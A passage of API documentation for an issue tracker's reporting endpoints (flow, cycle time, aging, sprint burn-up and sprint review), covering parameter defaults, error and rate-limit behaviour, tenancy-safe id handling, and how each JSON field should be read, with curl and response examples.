**Every windowed report shares one implementation of these rules, down to the wording of the messages**, so `/flow` and `/cycle-time` default, measure and refuse identically and a client that handles one handles the other. **Not every report has a window**, though. `/aging` asks a current-state question and takes no parameters at all, so **it has no `400` of its own** — and neither does its `.csv` sibling, for the same reason: a report that asks the caller for nothing has nothing to refuse. A malformed path UUID still `400`s on both, as it does everywhere, while the request is being bound and before any handler runs. The two sprint reports have no window either: their span is the sprint's, and a sprint longer than `app.reports.max-window-days` is **clipped and disclosed** (`seriesTruncatedAt`) rather than refused, because the caller never asked for that window — the sprint did, so there is nothing for them to correct. `/velocity` bounds its **sample** rather than a window: `sprints` is refused at both ends (1–12) rather than clamped, by the same never-answer-a-question-nobody-asked rule.

**A request-supplied id means one of two opposite things on this path, and you have to know which.** This is the one convention that is not uniform across the family, because it cannot be:

> A report's **subject** id resolves through its parent and `404`s. A report's **narrowing filter** id is never resolved: it is applied as an equality inside an already project-scoped statement, where it can only ever subtract.

So `typeId` / `componentId` / `labelId` on `/flow` and `/cycle-time` are **filters** — an unknown or foreign id narrows the report to an empty result with a `200` and is named in `meta.unmatchedFilters`, never a `404` or a `422`. And `sprintId` on `/sprint-burnup` and `/sprint-review` is the **subject** — the resource the whole report is *about* — so it resolves inside the project and an id that does not resolve there, including one belonging to another project or tenant, is a `404`. Getting either half backwards produces a plausible, wrong report: a filter that `404`s turns the endpoint into an existence oracle for another tenant's taxonomy, and a subject that narrows to empty answers a question nobody asked.

`/velocity` sits on the same rule from the other side: **its subject is the project**, which the path already names, so it takes no `sprintId` at all — its sample is resolved from the project — and it consequently has **no `404` of its own**.

**Which story points a sprint report uses — three reports, two rules, stated once.** All three read the same ledger, and they deliberately do not read the same estimate:

| Report | Points | Because |
|---|---|---|
| [`/sprint-burnup`](#sprint-burn-up--will-this-sprint-land-and-what-happened-to-the-plan) | the issue's **current** estimate | it charts a sprint that is still running, and the reader is asking a live question — so a re-estimate moves the line, including its past |
| [`/sprint-review`](#sprint-review--committed-added-removed-completed-carried-over) | the ledger's **entry snapshot** | the retrospective question is what a thing weighed *when it entered*; today's estimate would rewrite what the team committed to |
| [`/velocity`](#velocity--how-much-should-we-plan-for-next-sprint) | the ledger's **entry snapshot** | every sprint it describes is completed and frozen, and with current points a re-estimate today would move a bar drawn four months ago *and the band computed from it* |

Each is wrong for the other's question, so none of them will be changed to match the others. The one case where the burn-up also reads a snapshot is inherited rather than chosen: a **deleted** issue has no current estimate, so its snapshot is the only weight left.

**A date outside the supported band is a third `400`, refused before any arithmetic.** Report dates must fall in `1970-01-01`…`2200-12-31`, and one that does not is refused in the same refuse-and-name-it wording as the cap — naming the parameter, the value and the band. The floor is the epoch (issue history is written by this application and cannot predate it); the ceiling is deliberately loose, because a window may legitimately end in the future, and deliberately far below the largest representable date, because the point is a sane band rather than the last instant a database can store. The check runs **before** the window is measured and before any date is incremented: an extreme-but-perfectly-parseable year such as `+999999999-12-31` binds happily and used to overflow into a `500` on an endpoint whose contract promises `400`.

**Tenancy is resolved before the window is validated.** A caller who cannot see the project gets `404` even when the window is also malformed. A `400` there would tell an outsider that the project exists — cheaply, repeatably, and without ever authenticating as anyone entitled to know.

**Reports are throttled per principal, and that `429` comes *before* the `404`.** The whole `…/reports/**` path shares one budget per caller — 60 requests per minute by default — and a request past it is refused with `429` and a `Retry-After` header (seconds). **`POST …/search/insights` draws on this budget too**, even though it does not live under that path: being a report, it is bound to the limiter explicitly rather than by prefix, so a panel refresh and a burn-up fetch compete for one pot of 60.

The panel is also inside a **second, separate** budget — the 120-requests-per-minute one that covers [`POST …/search`](#search-hql), `/search/schema`, `/search/suggest` **and every [saved-filter](#saved-filters) operation** (validating a saved filter is search-surface work wherever it is mounted). It spends **both**, and the **lower configured value binds**. It sits on the reports limiter deliberately, because removing that binding would raise the panel’s allowance to the search budget as a side effect — so which of the two governs follows from whatever an operator has configured, and lowering *either* property lowers the panel. The two pots are kept apart because a person typing in a search box legitimately fires several requests a minute and should not be starved to protect charts — but the consequence for a client is worth stating plainly: **a panel refresh competes with report fetches *and* with searches.** **Every report shares that one budget rather than holding one each**, so a page that opens the sprint burn-up and the sprint review together spends two of it, and every report added later inherits the budget instead of having to ask for one. It is a **retryable throttle, not a fault**: nothing was computed, and the identical request succeeds after the wait; a report is never narrowed or approximated to fit a budget. A report needs this when no other read does because its cost is not bounded by what it returns: the flow report's opening balance counts history from before the window, so asking for a narrower window does not make it cheaper, and `private` caching means no shared cache ever absorbs a repeat.

The budget is spent **before** the workspace and project are resolved. The per-principal budgets — this one and the [search budget](#search-hql) over `…/search/**` and `…/filters/**` — are **the one place in this API where a `429` precedes a `404`**: an over-budget caller is refused even for a project they cannot see. That ordering is deliberate, and so is keying the budget on the **caller** rather than the project: a per-project key would answer differently depending on whether a project exists, turning a throttle into an existence oracle, and would let one colleague's open dashboard tab throttle everyone else on the project. Keyed on you, the `429` is identical for a real project, a nonexistent one and somebody else's.

One thing to know if you are sizing against this number: **the counters live in memory on each app node**, so a deployment running several instances gives each caller that budget *per instance* rather than one budget overall. With requests spread across replicas, the effective ceiling is the configured rate multiplied by the number of nodes. The throttle exists to keep a single caller from monopolising the database, and it still does that on every node — but it is not a global quota, and it should not be quoted as one.

One consequence worth stating for anyone sizing a deployment: because the key is the **principal**, this budget bounds **one user, not one workspace**. Ten members each get 60 report requests a minute, so aggregate report load still scales with member count — that is what a per-user limit does and does not promise, and it is not a defect. Size on members × budget, not on the budget alone.

### Flow — created vs resolved

`GET …/reports/flow` answers "are we keeping up?": one series of issues **created** per bucket, one of issues **resolved** per bucket, the count still **open** at each bucket's end, and the three totals under the chart.

```bash
curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/flow?from=2026-05-21&to=2026-08-19&interval=WEEK" \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "from": "2026-05-21", "to": "2026-08-19", "interval": "WEEK",
  "buckets": [
    { "date": "2026-05-18", "created": 14, "resolved": 9, "openAtEnd": 121, "partial": true },
    { "date": "2026-05-25", "created": 11, "resolved": 13, "openAtEnd": 119, "partial": false }
  ],
  "totals": { "created": 142, "resolved": 137, "net": 5 },
  "meta": {
    "computedAt": "2026-08-19T09:14:22Z", "basedOnIssues": 1842,
    "truncated": false, "cap": 20000,
    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
  }
}
```

**Every parameter is optional**, and no parameters at all means *the last 90 days, weekly, unfiltered*: `to` defaults to today in UTC, `interval` defaults to `WEEK`, and `from` defaults to `min(90, app.reports.max-window-days) - 1` days before `to` (the window counts **both** endpoints, so that is a 90-day window at the default cap). `from` and `to` are ISO dates interpreted in UTC, and `from=X&to=X` is one whole UTC day, not an empty range. An unparseable date, a date outside `1970-01-01`…`2200-12-31`, or an `interval` other than `DAY`/`WEEK`, is a `400`.

**The default window is derived from the cap, and that is *defaulting*, not clamping.** If an operator lowers the maximum window below 90 days, a parameterless call asks for the lower number rather than being refused by the endpoint's own cap — the default request this endpoint makes must be one it will actually serve. Nothing about the never-clamp rule changes: a caller who *sends* a window wider than the cap still gets the `400` naming it, because there the caller asked for something specific and answering a different question would be worse than answering none.

**Buckets are not snapped to bucket boundaries, so the first and last one can be partial.** A bucket's `date` is its **start**, on a UTC boundary — for `interval=WEEK` a **Monday** (ISO-8601; not configurable). A window that does not begin on one therefore opens with a bucket dated *before* `from`: the example above asks for `2026-05-21` (a Thursday) and the first bucket reads `2026-05-18`. That bucket counts **only what happened inside the requested window**, so its bar is legitimately shorter than a full week's — a reader who assumes whole weeks will misread it as a drop. The alternative, snapping your window outwards to whole weeks, would quietly answer a different question than the one you asked.

**Each bucket states this itself: `partial` is `true` when the bucket covers less calendar than a full interval.** The server's flag is **authoritative — do not compute it in the client.** Deriving it browser-side means re-implementing Monday truncation in a second language, and the first time the two disagree the chart footnotes the wrong bar; the server computes it from the same interval definition that produced the boundaries, so it cannot drift from them. Use it to annotate or de-emphasise the bar. At `interval=DAY` no bucket is ever partial.

**Buckets are zero-filled.** A bucket in which nothing happened is present with zeros rather than absent, so the series never has invisible gaps and an export never has missing rows.

`openAtEnd` is the count open at the **end** of that bucket: how many were open when the window started, plus every `created` minus every `resolved` up to and including it. The opening balance is real history — on a project with years behind it the line does not start at zero.

`totals` covers the whole window: `net` is `created - resolved`, signed on purpose, and positive means the backlog grew.

**`resolved` means "issues closed *now*, dated by their latest closure" — so past numbers can move.** This is an honest limitation of the data model rather than a bug, and it is worth stating plainly. The series are built from an issue's `createdAt` and `closedAt` and from nothing else; there is no resolution-event ledger. `closedAt` is **cleared** when an issue leaves a DONE status, so reopening an issue removes it from the bucket it used to sit in, and closing it again puts it in a new one. `openAtEnd` inherits the same caveat, one integral further on. The same window queried a week apart can therefore report different history, and a client rendering this report is expected to footnote it: *"Resolved counts issues that are closed now, dated by their latest closure. Reopened issues move."*

**The filter ids narrow the series; they never `404` or `422`.** `typeId`, `componentId` and `labelId` are ordinary equality filters over the project's own data (an issue carrying several labels is still counted once). An id that does **not** exist — or that exists but belongs to another project or another workspace — simply matches nothing and yields an **empty series with a `200`**. This is deliberate, and it is the opposite of what the rest of this API does with a request-supplied id: the report queries are project-scoped first, so an unknown filter can only ever narrow, and answering `404`/`422` instead would turn the endpoint into an existence oracle for another tenant's types and labels. You are not left guessing, though: **`meta.unmatchedFilters` names every filter that matched nothing in this project**, so an all-zero chart is never ambiguous — read that array before concluding it was a quiet quarter.

### Cycle time — how long finished work took

`GET …/reports/cycle-time` answers "how long does our work take?": one dot per issue **completed inside the window**, and the p50/p85 of both measures to draw across them.

```bash
curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/cycle-time?from=2026-05-21&to=2026-08-19" \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "from": "2026-05-21", "to": "2026-08-19",
  "items": [
    { "issueId": "0192f3…", "key": "DEMO-14", "title": "Search returns stale results",
      "typeId": "0192a1…", "startedAt": "2026-08-13T09:02:11Z", "closedAt": "2026-08-17T14:47:03Z",
      "cycleDays": 4.24, "leadDays": 11.7 },
    { "issueId": "0192f2…", "key": "DEMO-9", "title": "Importer times out on large CSVs",
      "typeId": "0192a1…", "startedAt": null, "closedAt": "2026-08-16T08:12:44Z",
      "cycleDays": null, "leadDays": 31.05 }
  ],
  "percentiles": {
    "cycle": { "p50": 4.1, "p85": 12.6 },
    "lead":  { "p50": 9.0, "p85": 28.4 }
  },
  "sampleSize": 214,
  "missingStartCount": 128,
  "meta": {
    "computedAt": "2026-08-19T09:14:22Z", "basedOnIssues": 214,
    "truncated": false, "cap": 20000,
    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
  }
}
```

**The window is a range on `closed_at`.** This report is about work that *finished* in the window, so an issue created two years ago and closed yesterday is in yesterday's report, and an issue created inside the window and still open is in no report here at all. That is the only reading under which the x-axis — completion date — *is* the window you asked for.

**Every parameter is optional and the window behaves exactly as [`/flow`](#flow--created-vs-resolved)'s does**: no parameters means *the last 90 days, unfiltered*, `to` defaults to today in UTC and `from` to `min(90, app.reports.max-window-days) - 1` days before it, both endpoints counted. The defaulting, the never-clamp rule, the `400` naming the cap, the `from > to` refusal and the `1970-01-01`…`2200-12-31` band are **one implementation shared with `/flow`**, messages included — a client that handles one handles the other, and there is nothing report-specific to re-read above.

**The honesty rule: cycle time is defined only for issues that have a recorded start.** `startedAt` was added in an earlier slice and backfilled best-effort — the backfill matches history rows to statuses by display *name*, so a renamed status is invisible to it, and an issue filed straight into an in-progress status wrote no history row at all — so any project with history has completed issues with no start. Those issues come back with **`cycleDays: null`**: not `0`, not "the same as lead". They contribute to `leadDays`, to `sampleSize` and to `missingStartCount`, and to nothing else.

**`created_at` is never substituted for a missing `started_at`**, and that is the single most important sentence on this endpoint. The substitution does not produce one wrong number in one place — it converts the whole report into a lead-time report wearing the label "cycle time", moves the p85 that [`/aging`](#aging-work-in-progress--what-is-rotting-now) draws across its columns, and says so nowhere in the response. What you get instead is the gap, counted. **Surface `missingStartCount`**: "cycle time available for 812 of 940 completed issues" is the sentence it exists for, and a client that hides it hands the reader a chart with a silent hole in it.

**Percentiles are suppressed below five samples, and the two measures are gated independently.** `percentiles.cycle` is computed over `sampleSize - missingStartCount` issues and `percentiles.lead` over `sampleSize` — different sets, and on an upgraded install wildly different sizes — so a window can legitimately return a usable `lead` pair beside a suppressed `cycle` one. Gating them together would either hide a number we have or print a p85 drawn from two issues.

**Suppression is `null`s inside the containers, never a missing container.** `percentiles`, `percentiles.cycle` and `percentiles.lead` are **always emitted**; read `percentiles.cycle.p50 === null` and do not code for an absent object. Suppression is a fact about the data, not a change of response shape. The threshold is fixed at five and is not configurable: it is a statement about what is meaningful, and a line whose threshold differs between installs is worse than a missing line.

**The lines describe the whole matching set even when the dots are truncated.** The percentiles are aggregates computed by PostgreSQL over every matching issue, not over the page of rows that survived `meta.cap` — a p85 over "the most recent 20 000" would be a different statistic wearing the same label. So on a truncated report the dots are a sample and the lines are the population, and **`sampleSize` versus `items.length` is what tells a client it received a subset** (`meta.truncated` says the same thing in one bit). **What survives truncation is the most recent work**: `items` are ordered most recently closed first, ties broken by id so a truncated report is deterministic. Assume the other end and you draw a wrong chart from a correct response.

**The filter ids narrow the scatter; they never `404` or `422`.** `typeId`, `componentId` and `labelId` behave exactly as they do on `/flow`: predicates applied inside an already project-scoped query, so an id that does not exist — or belongs to another project or tenant — matches nothing and yields an empty `items` with `200`, and `meta.unmatchedFilters` names it. A multi-label issue is counted once, in the counts and in the percentiles alike.

One `meta` field is worth reading with this report's own definitions in hand: **`basedOnIssues` equals `sampleSize`** here — the completed issues in the window after filters, not the shipped rows. **`firstIssueAt` is the family's and is *not* windowed**: it is the project's earliest issue that the filters admit, so on any project older than the window it predates `from`, and that is the point — it is what tells the reader whether the window they picked is wider than the history behind it. A value clipped to the window could only ever report the window back.

### Aging work in progress — what is rotting now

`GET …/reports/aging` is the other half of the same page and the one almost nobody ships: not "how long did finished work take" but **"which open item is rotting right now"**. A column per non-DONE status of the project's workflow, each holding its open issues oldest first, under the project's lifetime cycle-time percentiles.

```bash
curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/aging" \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "columns": [
    { "statusId": "0192b0…", "name": "To Do", "category": "TODO", "items": [] },
    { "statusId": "0192b1…", "name": "In Progress", "category": "IN_PROGRESS",
      "items": [
        { "issueId": "0192f7…", "key": "DEMO-31", "title": "Flaky import on large CSVs",
          "ageDays": 19.4, "assigneeId": "0192c4…", "startedAt": "2026-07-31T07:15:00Z" },
        { "issueId": "0192f9…", "key": "DEMO-44", "title": "Audit log paging",
          "ageDays": 6.02, "assigneeId": null, "startedAt": null }
      ] },
    { "statusId": null, "name": "Not on this board", "category": null,
      "items": [
        { "issueId": "0192e2…", "key": "DEMO-12", "title": "Legacy migration spike",
          "ageDays": 74.8, "assigneeId": "0192c9…", "startedAt": "2026-06-05T10:00:00Z" }
      ] }
  ],
  "percentiles": { "p50": 4.1, "p85": 12.6 },
  "meta": {
    "computedAt": "2026-08-19T09:14:22Z", "basedOnIssues": 37,
    "truncated": false, "cap": 20000,
    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
  }
}
```

**No parameters, and no window — deliberately.** "What is rotting *now*" is a question about current state. A window on it would be meaningless (every open issue is open today) or actively misleading (a window on `created_at` hides exactly the oldest items, which are the entire point). This is therefore the report whose *question* takes no input, so it has **no `400` of its own** — a property its `.csv` sibling inherits. It validates nothing, because there is nothing here for a caller to state wrongly, and a stray query parameter is ignored rather than refused. Its failures are `401`, `404` and `429` — plus the one that belongs to every endpoint rather than to this one, a malformed path UUID, which `400`s while the request is bound and before the handler runs. Its cost is bounded by work *in flight* rather than by history, which is a far smaller number on any healthy project — and capped anyway.

**"Open" means `status.category <> DONE`** — the same question the columns are keyed on — and *not* `closed_at IS NULL`. The two agree today only because the application maintains that invariant (stamped on entering DONE, cleared on leaving); asking the category is what keeps an issue from being in the report but in no column, or in a column but not the report.

**Columns come from the workflow, items come from the issues, and the two can disagree in both directions.** Columns are the project's *effective* statuses in board order minus the DONE category, **including the empty ones**: a status nobody is currently in is a fact about the board, and a report that draws only the columns it found rows for silently redraws its own axis every day. The reverse disagreement is the interesting one — an issue can sit in a status that is no longer in the project's workflow, because Hamstrack gates *transitions*, not existing rows, so a workflow swap strands whatever was mid-flight. **Those issues arrive in a single trailing column with `statusId: null`, `category: null` and the name `"Not on this board"`, and a client must render it.** A report whose purpose is to name the item nobody is looking at must not begin by hiding the items nobody is looking at. It is one column rather than one per retired status on purpose: the reader's question is "what is stranded", not "which dead status is it stranded in", and per-status columns would let a workflow swap add a dozen columns to a chart. It is also the one column that cannot be dragged to — that is what the `null` `statusId` is telling you.

**`ageDays` falls back to `created_at` when there is no `started_at`, and the asymmetry with `/cycle-time` is deliberate.** Cycle time is a measurement of finished work, where substituting filing time for start time produces a number that is simply wrong. Age is a question about something that has *not* happened yet, and "filed 40 days ago and nobody has picked it up" is a true, useful and materially **different** fact from "in progress for 40 days". Both belong on this board, so `ageDays` is never `null` — and the nullable `startedAt` is returned beside it precisely so a reader can tell the two apart rather than being handed a number with no account of where it came from. Every item in one response is aged against the same instant, and that instant is `meta.computedAt`.

**The percentile lines belong to the other half, and are deliberately unwindowed.** `percentiles` here is the **cycle time** p50/p85 of this project's *whole completed history* — not a window, and not whichever measure the page's toggle is showing. That is what makes the report actionable rather than a list: an item past the p85 line is visibly older than 85% of everything the team has ever finished, a statement about *this item*, in the team's own units, with no target, no SLA and nothing configured.

Two consequences, because both look like bugs from outside:

- **The same two field names mean different things on the two endpoints.** On `/cycle-time`, `p50`/`p85` belong to the window you requested and come as one pair *per measure*; here they are all-time and cycle-only. A client showing both must not label them alike.
- **They are computed from completed issues that have a `started_at`**, so a project whose history predates the backfill can have full columns and suppressed (`null`) lines. The columns still render — the lines are an overlay, not a precondition — and the client prints the same "not enough completed work to compute percentiles (need 5, have 3)" sentence the other half uses, off the same five-sample threshold.

**The lines are served from a 60-second per-project snapshot; the columns never are.** Their aggregate is the one statement in this feature that nothing the caller sends can narrow — no window, no cap, and it grows for the life of the project — so it runs at most once per project per minute per node. The claim is unchanged (the pass still covers the whole history when it runs), and the staleness is one this response already advertises to the browser with `Cache-Control: max-age=60`; a line drawn from years of history does not visibly move in a minute. The open half — the columns, the items and `meta.basedOnIssues` — is computed live on every request, because a minute-old count printed above a live item list is exactly the "these numbers don't match" failure `meta` exists to prevent.

**Truncation keeps the oldest.** Open issues are ordered oldest-first **project-wide** and the cap is applied to that single ordering *before* the rows are grouped into columns, so what survives is the aging end of the whole queue — the opposite end from `/cycle-time`'s, and the right one for each. (A truncated response therefore thins the freshest items out of every column at once, rather than trimming each column separately.) `meta.basedOnIssues` is how many open issues the report was *about*, which is larger than the number of items shipped when `meta.truncated` is true, and `meta.unmatchedFilters` is always empty because this endpoint takes no filters to leave unmatched.

**`meta.firstIssueAt` here is the project’s earliest issue, not the earliest open one** — the family’s definition, and it means the same thing on every report that populates it. Nothing is lost by that: the earliest open issue is already in the body, since items come back oldest-first, so it is literally the first item of the first non-empty column, with its key, its title and its age — strictly more than a bare timestamp in `meta` could say. The depth of the project's **completed** history, by contrast, is not derivable from this response at all, and it is exactly the provenance this report needs, because its `p50`/`p85` lines are computed over that entire history.

### Sprint burn-up — will this sprint land, and what happened to the plan

`GET …/reports/sprint-burnup` draws two lines over one sprint's days — **scope** (how much work was in the sprint at the end of each UTC day) and **completed** (how much of that was closed by then) — and under them `scopeChanges`, the log that explains every step in the first of them.

```bash
curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/sprint-burnup?measure=POINTS" \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "sprint": { "id": "0192d1…", "name": "Sprint 12", "state": "ACTIVE" },
  "startAt": "2026-08-14T09:00:00Z",
  "endAt": "2026-08-28T09:00:00Z",
  "measure": "POINTS",
  "committedAtStart": 60,
  "unestimatedCount": 4,
  "series": [
    { "date": "2026-08-14", "scope": 60, "completed": 0 },
    { "date": "2026-08-15", "scope": 60, "completed": 8 },
    { "date": "2026-08-16", "scope": 68, "completed": 8 }
  ],
  "scopeChanges": [
    { "at": "2026-08-16T11:04:22Z", "issueId": "0192f7…", "key": "DEMO-31",
      "event": "ADDED", "delta": 8, "actorId": "0192c4…", "storyPoints": 8 },
    { "at": "2026-08-19T15:41:08Z", "issueId": null, "key": "DEMO-77",
      "event": "REMOVED", "delta": -3, "actorId": null, "storyPoints": 3 }
  ],
  "seriesTruncatedAt": null,
  "meta": {
    "computedAt": "2026-08-20T09:14:22Z", "basedOnIssues": 28,
    "truncated": false, "cap": 20000,
    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
  }
}
```

**Both parameters are optional. `sprintId` defaults to the project's ACTIVE sprint**, of which a project has at most one (enforced in the database), so the default is unambiguous. `measure` defaults to `COUNT` — the measure every project has, whether or not it estimates — and is echoed back in the response so a client can never mislabel a chart it did not explicitly parameterise. An unknown `measure` is a `400`.

**`sprintId` is the report's SUBJECT, and it `404`s** — a sprint that belongs to another project or another tenant is indistinguishable from one that never existed. That is the opposite of `typeId` on `/flow`, and both halves are deliberate; see the subject-versus-filter rule under [How every report behaves](#how-every-report-behaves). (A `sprintId` that is not a UUID at all is a `400` rather than a `404`: it fails while Spring binds the parameter, before the handler runs, and a malformed id names no resource, so there is no existence for it to confirm.)

**No ACTIVE sprint is a `200` with `sprint: null`, not a `404`.** You asked a well-formed question about a project you can see, and *"there is no sprint running"* is an answer. A `404` there would be the same status as "that sprint is not in this project" — a genuinely different case — and would leave a client unable to tell a project between sprints from a bad id, and the empty state with no body to render. A sprint that exists but has **never started** answers the same way with `sprint` populated: `startAt: null`, an empty `series`, `committedAtStart: 0`. Commitment is an event, and it has not happened yet.

**The ideal guide is not in the response — you draw it, from `(startAt, 0)` to `(endAt, committedAtStart)`.** To the **committed** scope, not the current one. That is what makes it a guide rather than a verdict: a sprint that took work on sits *above* its guide, which is information, not failure. Regenerating the guide against today's scope would make every sprint look on-plan, which is the one thing this chart exists not to do.

**Points here are each issue's CURRENT estimate — and [`/sprint-review`](#sprint-review--committed-added-removed-completed-carried-over)'s are not. Both are deliberate. Do not report either as a bug against the other.**

- **Burn-up: current points.** Under `measure=POINTS` every issue is weighed by its `storyPoints` *as they stand today*, so **a re-estimate moves the whole scope line including its past** and a chart read yesterday can legitimately look different today. Footnote it in the UI ("Points reflect current estimates"). The alternative is not buildable anyway: the ledger writes a row only when membership changes, so a per-day estimate history does not exist and cannot be reconstructed from anything stored.
- **Review: the entry snapshot.** The retrospective question is *what did this weigh when it entered*, and today's estimate destroys that answer — an issue re-pointed from 3 to 8 after the sprint ended would retroactively rewrite what the team committed to.

The one exception is inherited rather than chosen: **a deleted issue has no current estimate**, so it is weighed here by its snapshot too — the only number left.

**Scope change is membership change only, and this is the rule that makes it a burn-up rather than a burndown.** The line steps up on an add and down on a remove and on **nothing else**: a re-estimate is never a scope event and **never appears in `scopeChanges`**, because the ledger writes no row for one. Every step in the line therefore has a timestamp, an issue and (for a live issue) an author — a scope increase is a fact with a name attached instead of an unexplained jump, which is precisely the disagreement a burndown cannot settle. (Under `POINTS` a re-estimate *does* move the line, as above; it simply is not a step with a date and an author, because nothing happened to the plan.)

**The commitment is not a change.** The `ADDED` rows a sprint's start writes are all stamped exactly `startAt`; they are already reported as `committedAtStart` and as the height of the first point, and they are deliberately **not** listed in `scopeChanges` — otherwise four real changes would be buried under twenty-three rows saying "the sprint started". Only events strictly after `startAt` are changes. `scopeChanges: []` is a real and common answer: it means the plan held.

**The line ends where it ends, and there is no projection.** The last point is today for a running sprint and the **completion instant** for a finished one — not the planned `endAt`, and not the end of the completion's calendar day. (Measuring at the following midnight would put the completion's own carry-out removals *inside* the last point, so the scope line would dive to exactly the work that was finished and **every** completed sprint would render as having delivered 100% of its final scope — a chart that cannot show a miss.) A sprint that overran is drawn to today, and its guide simply ends earlier than its lines do. No "at this rate you finish Thursday": forecasting is a later slice, with a stated sample size.

`completed` is **bounded above by `scope` by construction** — an issue that leaves the sprint takes its completion out with it, so the two lines can meet but cannot cross. Do not add a client-side guard for the crossing case; it cannot happen, and a guard would hide a real bug if it ever did.

**`unestimatedCount` is always populated, including under `COUNT`.** It counts the issues in the sprint at the **last plotted point** that carry no estimate. Under `POINTS` those contribute `0` to the series and are counted here — *"we didn't estimate it"* is not *"it's free"*, and reporting the zero without the count is the failure mode this pair exists to prevent. Under `COUNT` it is the honest footnote for the toggle the reader is about to flip.

**A deleted issue still appears in the log, and a client must render it as a real, unlinked entry.** The ledger's issue reference nulls on delete rather than cascading, precisely so that deleting an issue cannot quietly rewrite a finished sprint's record. Such a row keeps its `key`, its instant, its direction and its step, and reports **`issueId: null` and `actorId: null`**. The actor is dropped on purpose, not by a foreign key: an issue's own history is cascade-deleted with it, so keeping the name here would leave this log as the only surviving place in the product saying who moved a since-deleted issue — a wider survival than was ever argued for. The step, the instant, the direction and the key all survive; only the person does not.

**`storyPoints` on a log row is the entry snapshot, and it is independent of `delta`.** Carrying both is the point: `delta` is in the *requested measure*, so under `COUNT` it is ±1 and no point value would otherwise reach this log at all. A value the project already recorded stays visible even when `estimation` is switched off, so the estimate travels with the row rather than being inferred client-side from a number that means something else.

**`seriesTruncatedAt` is a second, separate limit — and it is not `meta.truncated`.** A sprint can be started with an arbitrarily **backdated** `startAt` (only future dates are refused), so the day count is caller-influenced and one request could otherwise ask for fifty thousand points. The day series is bounded by `app.reports.max-window-days`, and **the FIRST days are the ones kept**, because they carry the commitment, without which every later number means nothing. When that bites, `seriesTruncatedAt` names the last day the chart covers; the ordinary case is `null`. It is **not a `400`**: you stated no window here — the sprint did — so there is nothing for you to correct, and refusing would leave a legitimately long sprint with no chart at all.

Keep the two limits apart when you render them. `meta.truncated` means one specific thing: the `app.reports.max-rows` **row** cap bit, the number printed beside it in `meta.cap`. Folding the day clip into that flag made a twelve-issue sprint answer `basedOnIssues: 12`, `truncated: true`, `cap: 20000` and put "20 000" in a banner about a report that had dropped nothing of the kind.

**And note the asymmetry in what gets clipped with it.** `scopeChanges` is clipped to the same boundary **only when the chart is clipped**, and `unestimatedCount` is measured there too, so a clipped response never puts three numbers describing three different windows side by side. When `seriesTruncatedAt` is `null` the log deliberately runs to the end of the ledger instead: a completed sprint's carry-over rows are stamped a moment *after* `completed_at`, so bounding the log at the last chart point would silently drop the completion's own moves — the ones that explain where the remaining scope went. `/sprint-review` has no day bound at all (it returns lists, not a series), so on a clipped sprint the two reports legitimately describe different spans. That is exactly what this field announces.

**No capability changes any status code.** `board` and `estimation` gate the UI and nothing else: a `KANBAN` project's sprint answers exactly as a `SCRUM` project's does, and `measure=POINTS` returns a points series in a project whose `estimation` is `false`. A hidden control is not a permission, and a status code that depended on a capability is the documented bug the [delivery-capability model](#delivery-capabilities) exists to prevent.

### Sprint review — committed, added, removed, completed, carried over

`GET …/reports/sprint-review` is the retro record, and **not a chart**: five labelled lists of issue rows, each with a count, a point sum and an unestimated count, plus one header line's worth of `totals`. It shares its single ledger query with the burn-up.

```bash
curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/sprint-review?sprintId=$SPRINT" \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "sprint": { "id": "0192d1…", "name": "Sprint 12", "state": "COMPLETED" },
  "startAt": "2026-08-14T09:00:00Z",
  "endAt": "2026-08-28T09:00:00Z",
  "completedAt": "2026-08-29T16:20:11Z",
  "committed": {
    "count": 23, "points": 60, "unestimatedCount": 6,
    "issues": [
      { "issueId": "0192f3…", "key": "DEMO-14", "title": "Search returns stale results",
        "typeId": "0192a1…", "assigneeId": "0192c4…", "statusId": "0192b3…",
        "points": 5, "closedAt": "2026-08-17T14:47:03Z", "deleted": false }
    ]
  },
  "addedAfterStart":  { "count": 5, "points": 13,   "unestimatedCount": 1, "issues": [] },
  "removedBeforeEnd": { "count": 3, "points": null, "unestimatedCount": 3, "issues": [] },
  "completed":        { "count": 18, "points": 41,  "unestimatedCount": 4, "issues": [] },
  "carriedOver": {
    "count": 7, "points": 19, "unestimatedCount": 2,
    "issues": [
      { "issueId": null, "key": "DEMO-77", "title": null,
        "typeId": null, "assigneeId": null, "statusId": null,
        "points": 3, "closedAt": null, "deleted": true }
    ]
  },
  "totals": {
    "committedCount": 23, "committedPoints": 60,
    "atEndCount": 25, "atEndPoints": 60,
    "completedCount": 18, "completedPoints": 41,
    "addedAfterStartCount": 5
  },
  "meta": {
    "computedAt": "2026-08-20T09:14:22Z", "basedOnIssues": 28,
    "truncated": false, "cap": 20000,
    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
  }
}
```

**Subject resolution is the burn-up's, exactly**: `sprintId` defaults to the project's ACTIVE sprint, no ACTIVE sprint is a `200` with `sprint: null` and five empty lists, a sprint that never started answers the same way with `sprint` populated, and a `sprintId` that does not resolve inside this project is a `404` — a subject, never a filter. There is **no `measure` parameter**: this report reports counts *and* points for every list, so there is nothing to toggle.

**Points here are the ledger's entry SNAPSHOT, the opposite of the burn-up beside it, and on purpose.** Every point value in this response is what the issue weighed **when it entered this sprint**, never today's estimate — see the burn-up's section above for the full statement of the pair. The consequence worth relying on: **every number in this response is stable for a COMPLETED sprint.** The ledger is append-only and id-keyed, so the record survives renames, survives re-estimates, and survives the deletion of the issues themselves.

**The sprint's end is when it was COMPLETED, not when it was planned to end.** Every "before the end" boundary in this record is `completedAt` for a finished sprint and the instant of the request for a running one; `endAt` is reported beside them and decides nothing. A sprint completed three days late did not remove anything "after the end" for those three days, and one completed early did not carry over the work it had already stopped doing.

